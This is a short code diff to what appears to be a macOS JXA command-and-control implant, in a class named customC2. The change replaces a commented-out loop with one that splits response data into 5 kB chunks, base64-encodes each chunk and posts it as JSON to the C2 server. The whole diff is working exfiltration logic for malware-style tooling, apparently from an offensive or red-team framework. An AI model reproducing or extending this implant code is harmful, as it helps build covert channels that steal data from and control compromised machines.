@@ -32,7 +32,17 @@ class customC2 extends baseC2{
 		//depending on the amount of data we're sending, we might need to chunk it
 		//  current chunks at 5kB, but we can change that later
 		var size=5000;
+		var offset = 0;
 		//console.log("total response size: " + data.length);
+		do{
+		    var csize = data.length - offset > size ? size : data.length - offset;
+		    var dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
+		    var encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
+		    offset += csize;
+		    var postData = {"response": encodedChunk};
+		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
+		}while(offset < data.length);
+		/*
 		for(var i = 0; i < data.length; i+=size){
 			//console.log(i);
 			var chunk = data.substring(i,i+size);
@@ -47,7 +57,8 @@ class customC2 extends baseC2{
 			var post_data = {"response":encoded_chunk};
 			var jsondata = this.htmlPostData(urlEnding, JSON.stringify(post_data));
 			//console.log("returned data: " + JSON.stringify(jsondata));
-		}
+		}*/
+
 		return jsondata;
 	}
 	htmlPostData(urlEnding, sendData){
